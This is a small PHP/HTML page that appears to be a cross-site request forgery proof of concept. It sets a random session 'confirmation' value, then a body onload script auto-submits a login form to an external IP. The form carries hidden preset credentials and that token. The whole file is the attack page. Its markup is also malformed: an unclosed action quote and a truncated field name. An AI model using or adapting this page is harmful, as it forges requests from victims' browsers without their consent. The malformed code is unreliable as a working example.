<?php
  session_start();
  $_SESSION['confirmation'] = rand(5000, 50000);
?>

<script>
  function getFormInfo() { document.login.submit(); }
</script>

<body onload="getFormInfo();">
<div id='msg'></div><br />
<form name="login" method="POST" action="http://178.128.224.10/csfr_action.php>
  <label for="user">Username:</label><br />
  <input type="text" name="user1"><br />
  <label for="pwd">Password:</label><br />
  <input type="password" name="pwd1"><br /><br />
  <input type="hidden" value="host" name="user" />
  <input type="hidden" value="pass" name="pwd" />
  <input type="hidden" value=<?php echo $_SESSION['confirmation']; ?> name="con>
  <input type="submit" value="Submit" name="submit">
</form>
</body>